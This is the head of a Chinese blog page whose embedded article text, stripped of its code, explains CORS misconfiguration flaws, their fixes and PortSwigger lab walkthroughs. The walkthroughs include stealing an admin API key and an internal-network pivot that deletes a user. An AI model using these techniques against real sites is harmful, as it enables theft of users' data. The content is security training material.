<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>CORS跨域漏洞 | hybcx</title><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="CORS跨域漏洞"><meta name="application-name" content="CORS跨域漏洞"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="CORS跨域漏洞"><meta property="og:url" content="http://hybcx.xyz/2023/07/26/cors-kua-yu-lou-dong/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="CORS跨域漏洞 0x01 漏洞简介 跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据，目前已经被绝大多数浏览器支持，并被主流网站广泛部署使用。跨域资源共享"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="CORS跨域漏洞 0x01 漏洞简介 跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据，目前已经被绝大多数浏览器支持，并被主流网站广泛部署使用。跨域资源共享"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/07/26/cors-kua-yu-lou-dong/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'CORS跨域漏洞',
  postAI: '',
  pageFillDescription: 'CORS跨域漏洞, 0x01 漏洞简介, 同源策略, 跨域访问的一些场景, 跨域请求方式, 0x02 CORS跨域原理及漏洞成因, 0x03 CORS漏洞攻击流程, 0x04 修复及防御方式, 0x05 简单请求的示例, 0x06 漏洞利用, 0x07 漏洞发现技巧, 方式一 BurpSuite, 方式二 Access-Control-Allow-Origin：, 方式三 使用CORScanner工具(漏洞自动化扫描), 0x08 其他可能利用漏洞的地方, 8.1 解析Origin头时出错, 8.2 利用相互受CORS信任的域来进行XSS, 8.3 白名单中的null值, 0x09 利用CORS漏洞(偏实际环境), 方式一：存在用户凭证, 0x12 bp官网的靶场练习, 实验一 具有基本原点反射的 CORS 漏洞, 实验室二：受信任空源的CORS漏洞, 实验三  受信任的不安全协议的CORS漏洞, 实验四 CORS漏洞与内部网络枢轴攻击跨域漏洞漏洞简介跨域资源共享是一种放宽同源策略的机制它允许浏览器向跨源服务器发出请求从而克服了只能同源使用的限制以使不同的网站可以跨域获取数据目前已经被绝大多数浏览器支持并被主流网站广泛部署使用跨域资源共享漏洞主要是由于程序员配置不当对于源校验不严格从而造成跨域问题攻击者可以利用错误配置漏洞从恶意网站跨域读取受害网站的敏感信息是提供的一种机制应用程序可以通过在增加字段来告诉浏览器哪些不同来源的服务器是有权访问本站资源的当不同域的请求发生时就出现了跨域的现象同源策略这里我们必须要了解一下同源策略同源策略是一种限制性的跨域规范它限制了网站与源域之外的资源进行交互的能力起源于多年前的策略是针对潜在的恶意跨域交互例如一个网站从另一个网站窃取私人数据而制定的通常它允许一个域向其他域发出请求但不允许访问响应源由通信协议域和端口号组成是一个很好的策略但是随着应用的发展网站由于自身业务的需求需要实现一些跨域的功能能够让不同域的页面之间能够相互访问各自页面的内容简单来说同时满足同协议同域名同端口这三个条件就是同源浏览器的同源策略规定不同域的客户端脚本在没有明确授权的情况下不能读写对方的资源全称为即同源策略该策略是浏览器的一个安全基石同源策略规定不同域的客户端脚本在没有明确授权的情况下不能读写对方的资源简单来说同源策略就是浏览器会阻止一个源与另一个源的资源交互可以试想一下如果没有同源策略当你访问一个正常网站的时候又无意间打开了另一个恶意网站恶意网站会从你刚刚访问的正常网站上窃取你全部的信息跨域访问的一些场景比如后端开发完一部分业务代码后提供接口给前端用在前后端分离的模式下前后端的域名是不一致的此时就会发生跨域访问的问题程序员在本地做开发本地的文件夹并不是在一个域下面当一个文件需要发送请求请求另外一个页面的内容的时候就会跨域电商网站想通过用户浏览器加载第三方快递网站的物流信息子站域名希望调用主站域名的用户资料接口并将数据显示出来跨域请求方式定义了两种跨域请求简单跨域请求和非简单跨域请求只要同时满足以下两大条件就属于简单请求请求方法是以下三种方法之一的头信息不超出以下几种字段只限于三个值简单的说就是设置了一个白名单符合这个条件的才是简单请求其他不符合的都是非简单请求浏览器对简单请求和非简单请求的处理机制不一样对于简单请求浏览器就会立刻发送这个请求对于非简单请求浏览器不会马上发送这个请求而是有一个跟服务器验证的过程浏览器先发送一个方法的预检请求跨域原理及漏洞成因浏览器将请求分成两类简单请求和非简单请求对于简单请求大致流程是浏览器发现这一次向服务器提交的请求是简单请求所以自动在头信息中增加了一个的字段用来表示这次的请求来自哪个域当服务器接收到请求后发现字段指定的域名在许可范围内服务器会在响应包中增加三个与相关的字段其中字段是必须存在的它的值可能是字段的值或者是一个通配符表示可以接受任意域名的请求当然大部分服务器如果配置了通配符的话信息泄露的风险骤然加大再回到三个字段上其中字段不是必选字段它的值是一个布尔值且只能设置为表示服务器允许浏览器将包含在请求中否则就不添加此字段但需要注意的是如果要发送就不能设为星号必须明确指定与请求网页一致的域名同时依然遵循同源策略而字段主要是指定想要获取对象中方法的其他服务器字段所谓非简单请求就是那种对服务器提出特殊要求的请求例如请求方法为或非简单的请求会在正式通信之前增加一次查询请求称之为预检请求浏览器先询问服务器当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些动词和头信息字段只有获得了肯定响应浏览器才会正式发出请求否则就报错这种请求的好处是对传统的没有支持的服务器减小压力给服务器一个提前拒绝的机会具体流程如下当构造请求包的方法是或并传给浏览器时浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包请求头是并携带三个关键字段其中表示浏览器的请求会用到哪些方法表示浏览器请求会额外发送的头信息字段服务器收到预检请求后检查了三个核心字段以后如果确定允许跨域请求会返回一个正常的回应并携带传入的头信息如果服务器否定请求虽然也会返回一个正常的回应但是没有任何相关的头信息字段或明确表示请求不符合条件浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求使用检查请求头的相关字段和服务端的规则进行对比来选择是否允许跨域但凡是需要配置规则的程序避免不了会出现一些意外就像很多资深程序员有时也会写不出恰当的正则一样当服务端配置的规则不够合理导致非同域的资源可以互相访问例如反而使同源策略的保护机制土崩瓦解因此漏洞的成因很明显就是服务端配置的规则不当所导致的漏洞攻击流程假设用户登陆一个含有配置网站同时又访问了攻击者提供的一个链接的网站向这个网站发起请求获取敏感数据浏览器能否接收信息取决于的配置如果配置了头且为预期那么允许接收否则浏览器会因为同源策略而不接收代码如下代码如下在访问后再次访问就可以在页面发现的在这里我们假设此就是黑客想要获取的敏感信息然后构造黑客发生送给用户的恶意页面当用户点开此网页时由通过发出一个向的资源请求所以浏览器自动添加了字段接下来黑客将获取到的敏感信息提交到中而将数据保存在里代码如下黑客的请求流程是我们通过的功能重放抓到的请求包可以发现响应包是含有返回内容的也就是请求到的资源但是在中并没有返回的资源通过检查浏览器的控制台提示信息发现由于响应包缺少响应头导致浏览器拦截了跨源请求去掉服务端的注释重新访问发现响应包中出现了对应的响应头指是允许访问的源指的是允许带上访问资源这样浏览器就不会出错而拦截请求了随后脚本把页面编码后发送到去模拟黑客访问页面可以发现已经被窃取过来的敏感信息至此成功利用漏洞进行跨域资源访问修复及防御方式仔细评估是否开启如果不必要就不要开启如果是绝对必要的话要定义源的白名单尽量不使用正则表达式配置不要配置为通配符同时严格校验来自请求的值仅仅允许安全的协议有必要验证协议以确保不允许来自不安全通道的交互否则中间人将绕过应用是所使用的要尽可能的返回这个头部以避免攻击者利用浏览器缓存如果可能的话避免使用头由于标头设置为时允许跨域请求中带有凭证数据因此只有在严格必要时才应配置它此头部也增加了攻击的风险因此有必要对其进行保护限制使用的方法通过头部还可以配置允许跨域请求的方法这样可以最大限度地减少所涉及的方法限制缓存的时间通过和头部限制浏览器缓存信息的时间可以通过使用标题来完成该头部接收时间数作为输入该数字是浏览器保存缓存的时间配置相对较低的值例如大约分钟确保浏览器在短时间内可以更新策略比如允许的源仅配置所需要的头仅在接收到跨域请求的时候才配置有关于跨域的头部并且确保跨域请求是合法的只允许来自合法的源简单请求的示例跨域资源共享规范规定了在服务器和浏览器之间交换的标头内容该标头内容限制了源域之外的域请求资源规范标识了协议头中最重要的一组当网站请求跨域资源时服务器将返回此标头并由浏览器添加标头例如下面的来自站点的网页应用想要访问的资源第行是请求首部在第行的请求头表明该请求来源于第行是来自于的服务端响应响应中携带了响应首部字段第行使用和就能完成最简单的访问控制本例中服务端返回的表明该资源可以被任意外域访问如果服务端仅允许来自的访问该首部字段的内容如下如果跨域请求可以包含的话在服务器响应里应该有这一字段这样的话攻击者就可以利用这个漏洞来窃取已经在这个网站上登录了的用户的信息利用漏洞利用这里以靶场为例这个接口会返回已登录的用户的信息数据通过访问该网页的响应我们看到这里可能存在跨域资源共享漏洞接下来我们就可以建立一个恶意的代码作用解释如下这段代码的作用是将的内容设置为具有的元素的内部具体解释如下是一个方法它通过元素的属性获取对应的元素在这个例子中它获取具有的元素是获取或设置元素的内部内容的属性通过将等号右侧的值赋给它可以更新元素的内部内容是对象的属性它包含从服务器返回的响应文本因此这行代码的作用是将服务器返回的响应文本设置为具有的元素的内部内容这样在网页中具有的元素会显示服务器返回的文本内容访问这个页面就可以获取已登录的用户的信息该恶意代码首先定义一个函数以形式访问目标网址创建对象为通过的判断请求状态如果请求已完成且相应已就绪则弹出返回文本漏洞发现技巧在之前我们了解了一些关于跨域资源共享通信的一些字段含义的漏洞主要看当我们发起的请求中带有头部字段时服务器的返回包带有的相关字段并且允许的域访问方式一一般测试漏洞都会用上而可以实现帮助我们检测这个漏洞方式一首先是自动在请求包中加上的头部字段打开选择模块中的选项找到这一栏勾选将空替换为的框在中输入列表中出现符合条件的请求包点击点击如下图即该处有漏洞组合应是这种注意如下组合是没有漏洞的因为浏览器已经会阻止如下配置当我们进行测试时看服务器响应头字段里可以关注这几个点最好利用的配置可能存在可利用的配置很好的条件但无法利用下面这组配置组合虽然看起来很完美但是机制已经默认自动禁止了这种组合算是的最后一道防线单一的情况方式二命令输入如果出现这种组合说明存在漏洞方式三使用工具漏洞自动化扫描上提供了一个关于扫描配置漏洞的脚本是一个工具旨在发现网站的错误配置漏洞它可以帮助网站管理员和渗透测试人员检查他们针对的域是否具有不安全的策略总结漏洞的原因服务端的设置为了并且设置为这样任何网站都可以获取该服务端的任何数据了有一些网站的他的设置并不是固定的而是根据用户跨域请求数据的来定的这时不管设置为了还是任何网站都可以发起请求并读取对这些请求的响应意思就是任何一个网站都可以发送跨域请求来获得服务端上的数据安全隐患这个流程中服务器接收到跨域请求的时候并没有先验证而是先处理了请求所以从某种程度上来说在支持的浏览器上实现跨域的写资源打破了传统同源策略下不能跨域读写资源如果将设置为允许来自所有域的跨域请求那么的安全机制几乎就无效了但是这里在设计的时候有一个很好的限制发送的请求需要使用来带上如果一个目标域设置成了允许任意域的跨域请求这个请求又带着的话这个请求是不合法的就是如果需要实现带的跨域请求需要明确的配置允许来源的域使用任意域的配置是不合法的浏览器会屏蔽掉返回的结果其他可能利用漏洞的地方解析头时出错一些支持从多个来源进行访问的应用程序通过使用允许的来源白名单来实现收到请求后会将提供的来源与白名单进行比较如果来源出现在白名单中那么它会反映在标题中以便授予访问权限例如应用收到一个正常的请求应用根据其允许的来源列表检查当前请求资源的来源如果在列表中则按以下方式反映该来源但在检测来源是否存在于白名单时经常可能出现问题一些网站可能会允许其所有的子域包括尚未存在未来可能存在的子域来进行访问或者允许其他网站的域以及其子域来访问请求这些请求一般都通过通配符或者正则表达式来完成但是如果这其中出现错误可能就会导致给予其他未被授权的域访问权限例如例如假设一个应用程序授予对以下列结尾的所有域的访问权限攻击者可能可以通过注册域来获得访问权限或者假设应用程序授予对所有以开头的域访问权限攻击者就可以使用该域获得访问权限利用相互受信任的域来进行假如两个互相受信任的源如果其中一个网站存在攻击者就可以利用注入一些代码利用这些代码对信任其源的另一个网站进行敏感信息的获取如果进行请求时网站响应就可以利用漏洞在网站上使用下面的来通过检索密钥白名单中的值协议的一个重要安全前提是跨域请求中的头不能被伪造这个前提并不是总是成立头最早被提出用于防御攻击它的语法格式在中被定义规定如果请求来自隐私敏感上下文时头的值应该为但是它却没有明确界定什么是隐私敏感上下文协议复用了头但在标准中同样缺乏对跨域请求中明确的定义和限制有些开发者在网站上配置信任用于与本地页面共享数据如下所示在这种情况下攻击者可以使用各种技巧来生成跨域请求该请求构造的为值这将满足白名单的要求从而导致跨域访问例如可以使用以下格式的沙盒跨域请求来完成这就意味着任何配置有和的网站等同于没有浏览器的保护都可以被其他任意域以这种方式读取内容利用漏洞偏实际环境流程假设用户登陆一个含有配置网站同时又访问了攻击者提供的一个链接的网站向这个网站发起请求获取敏感数据浏览器能否接收信息取决于的配置如果配置了头且为允许接收否则浏览器会因为同源策略而不接收方式一存在用户凭证详细过程创建一个脚本去发送请求关键代码如下当带有目标系统的用户访问的主机访问上述代码的页面时浏览器就会发送下面的请求到存在配置的服务器响应包因为服务器发送了右边的给客户端所以攻击的浏览器允许包含恶意的代码的页面访问用户的隐私数据方式二不存在用户凭证跨域漏洞详细过程攻击方式绕过基于的认证如果目标应用程序与受害者的网络可达性并且目标应用程序使用地址作为身份验证的方式则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于的身份验证攻击方式客户端缓存中毒例如数据报文头部中包含标头其值未进行任何输入验证输出编码请求包响应包已被设置与头适合设置构造存在恶意的有效负载页面诱使受害者触发攻击方式服务器端缓存中毒利用的错误配置注入任意头部将其保存在服务器端缓存中可用于构造存储类型利用条件存在服务器端缓存能够反射头部不会检查头部中的特殊字符如利用方式攻击用户使用作为的标题段的终结符请求包回车码十六进制响应包如果攻击者能提前发送畸形的消息头则利用代理或命令行的方式发送则服务器就会缓存这样的返回报文并作用于其他用户上例中攻击者将页面的编码设置为可引发中断类型描述在正常的网页被嵌入了到攻击者控制页面的跨域请求从而劫持用户的会话挖掘同上利用交互式通过绕过一些反会话劫持的方法如限制的绑定地址的会话等劫持用户会话程序猿在写请求的时候对目标域限制不严有点类似于跳转出现过这样一个案例通过里的参数进行请求预防漏洞漏洞主要是由于配置错误而引起的所以预防漏洞变成了一个配置问题下面介绍了一些针对攻击的有效防御措施正确配置跨域请求如果资源包含敏感信息则应在标头中正确指定来源只允许信任的网站看起来似乎很明显但是中指定的来源只能是受信任的站点特别是使用通配符来表示允许的跨域请求的来源而不进行验证很容易被利用应该避免避免将列入白名单避免使用标题来自内部文档和沙盒请求的跨域资源调用可以指定来源应针对私有和公共服务器的可信来源正确定义头避免在内部网络中使用通配符避免在内部网络中使用通配符当内部浏览器可以访问不受信任的外部域时仅靠信任网络配置来保护内部资源是不够的不能替代服务器端安全策略定义了浏览器的行为绝不能替代服务器端对敏感数据的保护攻击者可以直接从任何可信来源伪造请求因此除了正确配置的之外服务器还应继续对敏感数据应用保护例如身份验证和会话管理靶场练习该靶场内置了个的漏洞场景场景一信任任意源场景二正则表达式检测源场景三信任任意源跨域漏洞漏洞检测一般情况下修改请求包中的字段为任意域名或者为的方式去检测该漏洞是否存在场景一信任任意源应用程序接受来自任何的请求该代码将值放在响应头中现在此配置将允许来自任何的任何脚本向应用程序发出请求浏览器将执行标准的请求检查来自恶意域的脚本将能够窃取数据应用程序接受标头中指定的任何值跨域漏洞可以看到箭头处的域名是任意的而该网站都允许域名发出请求并回显处是我自己添加的场景二正则表达式检测源应用程序已实施策略并对列入白名单的域子域执行正则表达式检查在这种情况下应用程序在代码中具有弱正则表达式实现它只检查请求标头中任何位置的域名的存在如果标头的值为或正则表达式会将其标记为通过这种错误配置将导致跨源共享数据应用程序信任列入白名单的跨域漏洞应用程序不允许任何任意来源可以看到下图右侧没有头跨域漏洞应用程序弱正则表达式允许在域名开头具有白名单域字符串的跨域漏洞应用程序弱正则表达式允许在域名末尾具有白名单域字符串的跨域漏洞场景三信任源在这种情况下应用程序响应标头始终设置为当用户指定以外的任何值时应用程序不会处理它并在响应中继续反映允许攻击者执行漏洞利用的技巧很少并且可以使用请求过滤受害者的数据应用程序接受标头中指定的值跨域漏洞注意事项如果响应包中为以下情况则不存在漏洞跨域漏洞原因是因为浏览器会对此类情况的请求进行自动拦截不具备漏洞利用条件在靶场的目录下有漏洞利用的脚本以为例用文本编辑器打开该脚本文件找到如下代码并根据实际应用场景进行修改向目标应用程序网页发出请求以获取响应的函数分割打印被盗取的响应将更改为错误配置策略的将利用脚本放置在搭建的恶意网站下当受害者在同一浏览器登录目标网站并打开该恶意链接即可盗取目标网站的响应内容这里我复现不出来官网的靶场练习实验一具有基本原点反射的漏洞信息该网站具有不安全的配置因为它信任所有来源要解决该实验室问题请编写一些使用检索管理员密钥并将代码上传到漏洞利用服务器的当您成功提交管理员的密钥时该实验就解决了您可以使用以下凭据登录到您自己的帐户首先开启代理同时关闭拦截记录你浏览网页的请求登陆账号查看历史记录并观察到密钥是通过请求检索的并且响应包含标头表明它可能支持接下来我们将其发送到重发器验证是否有漏洞如上图我们在请求区添加头并写入随意的一个域名响应后发现右侧的头出现我们输入的域名不论我们的域名是什么这说明的确存在漏洞即允许任意源的访问接下来我们要编写脚本意在向服务器发送获取管理员详细信息的请求这里是并将请求得到的数据存放在我们的日志中此处换成你实验室的即可接着将该脚本添加到漏洞服务器中发送给受害者查看你的日志如下图可以看到成功得到管理员的如上图从左到右依次点击即可实验室二受信任空源的漏洞提示这个网站有一个不安全的配置因为它信任来源为了解决这个实验编写一些使用检索管理员的密钥并将代码上传到漏洞利用服务器当您成功提交管理员的密钥时该实验就解决了您可以使用以下凭据登录到自己的帐户同上题登陆账号单击我的帐户查看历史记录并观察到密钥是通过请求检索的并且响应包含标头表明它可能支持经过实验发现这次不能允许任意源的访问了那我们给赋值为看看响应发现成功响应接着用构造源的请求来绕过在浏览器中转到漏洞利用服务器并输入以下将替换为实验室的将替换为漏洞利用服务器我的是注意沙箱的使用因为这会生成一个空的源请求原因如下回答这里沙箱为何会产生一个空的源请求在给定的代码中使用了一个具有沙箱属性的元素它的属性被设置为这些属性指定了一组沙箱规则用于限制嵌入的文档的行为其中属性允许嵌入的文档执行脚本属性允许嵌入的文档导航到顶级窗口属性允许嵌入的文档提交表单当使用具有沙箱属性的元素时如果没有指定属性则会执行属性的内容作为内联文档在这种情况下内联文档的源被视为一个空字符串由于源被视为一个空字符串因此在发出请求时浏览器会创建一个空的初始请求因为没有指定具体的源这个初始请求不会导致真正的网络请求也不会发送到服务器因此你观察到的是一个空的源请求需要注意的是沙箱属性可以提供一定的安全性但它仍然需要在合适的场景和正确的使用方式下才能发挥作用开发者应该仔细考虑并评估是否需要使用沙箱以及如何设置沙箱属性以确保安全性和功能之间的平衡单击查看漏洞利用观察漏洞利用是否有效已登录到日志页面密钥位于中测试的可行性就不在这测了直接到发给受害者返回到利用漏洞攻击服务器并单击将利用漏洞攻击发送给受害者成功实验三受信任的不安全协议的漏洞提示此网站具有不安全的配置因为它信任所有子域而不管协议如何解决实验编制使用检索管理员的密钥并将代码上载到漏洞利用服务器并提交已有账号如上图依旧可能存在漏洞发送到重发器验证此时将标头改为是实验室域名我的是如上图成功发现利用漏洞发现其任意子域都可以访问组合利用打开一个产品页面单击并观察它是使用一个子域上的加载的接下来验证该子域是否存在漏洞如下图响应中并没有对我们的恶意代码进行某些必要的编码过滤因此的确存在漏洞在浏览器中转到漏洞利用服务器并输入以下将替换为您的唯一实验室将替换为您的漏洞利用服务器我的是实验四漏洞与内部网络枢轴攻击提示此网站具有不安全的配置因为它信任所有内部网络来源完成实验编制来定位本地网络端口上的端点然后使用该端点来识别和创建基于的攻击以删除用户删除用户后实验将得到解决需要扫描本地网络以查找端点将替换为有效负载或漏洞利用服务器上述代码解析回答解析定义了一个空数组用于存储异步请求的队列定义了一个变量指定了协作者的使用一个循环从到生成了一系列函数并将这些函数添加到队列中每个生成的函数将调用函数并将不同的地址组合成一个使用另一个循环从到不断从队列中取出函数并调用它们传递不同的等待时间参数定义了一个函数用于发起异步请求创建了一个对象和对应的信号使用函数发送一个请求到指定的并指定作为参数传递给请求选项当请求成功返回时将响应的文本内容作为参数拼接到指定的协作者并进行重定向如果请求失败则判断队列是否还有剩余的函数如果有则取出下一个函数并执行使用设置一个超时定时器当超时时终止请求并执行与上述相同的处理逻辑这段代码的目的是通过循环异步请求来尝试访问本地网络中的服务并将响应的文本内容发送到协作者的服务器在漏洞利用服务器中输入以下代码单击存储然后单击将漏洞利用发送给受害者检查日志或交互组件并查看发送给它的代码参数发现重新在利用漏洞攻击服务器中输入以下代码将替换为从协作者交互中检索到的地址和端口号不要忘记添加有效负载或再次利用服务器更新并提供漏洞利用代码解析回答解析定义了一个函数用于执行攻击构造了一个带有恶意脚本的该包含了目标网站的登录页面地址时间戳恶意用户名和密码以及来自目标网站的令牌将当前页面的设置为构造的恶意从而实现跳转和注入恶意脚本的目的定义了一个函数用于发送异步请求获取目标的响应内容并触发攻击使用函数发送一个请求到目标并获取响应的文本内容在响应返回时将目标响应文本和恶意向量作为参数传递给函数以触发攻击调用函数传递目标和协作者作为参数以发起异步请求并触发攻击这段代码的目的是通过发送异步请求来获取目标网站的响应内容并在响应内容中注入恶意的脚本代码通过构造恶意的登录并将当前页面的设置为该当用户访问该页面时恶意的脚本将执行并在用户的浏览器上执行攻击者所期望的操作现在我们将探测用户名字段中的漏洞检索中具有的交互或者在日志中看到重新在利用漏洞攻击服务器中输入以下代码将替换为与步骤中相同的地址和端口号再次添加有效负载或漏洞利用服务器更新并提供漏洞利用交互或利用服务器日志会提供管理页面的源代码检索源代码会注意到有一个允许删除用户的表单重新在利用漏洞攻击服务器中输入以下代码将替换为相同的地址和端口号源代码脚本代码解析回答解析定义了一个函数用于执行攻击构造了一个带有恶意脚本的该包含了目标网站的登录页面地址时间戳恶意用户名和密码以及来自目标网站的令牌将当前页面的设置为构造的恶意从而实现跳转和注入恶意脚本的目的定义了一个函数用于发送异步请求获取目标的响应内容并触发攻击使用函数发送一个请求到目标并获取响应的文本内容在响应返回时将目标响应文本和恶意向量作为参数传递给函数以触发攻击在构造恶意向量时使用了一个包含元素的恶意脚本代码该元素的属性设置为并在加载完成时触发一个代码该代码会找到目标页面中的表单将用户名字段如果存在设置为然后自动提交表单调用函数传递目标作为参数以发起异步请求并触发攻击这段代码的目的是通过发送异步请求来获取目标网站的响应内容并在响应内容中注入恶意的脚本代码通过构造恶意的登录并将当前页面的设置为该当用户访问该页面时恶意的脚本将执行并在用户的浏览器上执行攻击者所期望的操作代码通过注入一个指向页面的提交表单以删除详情参考',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-12 15:04:56',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
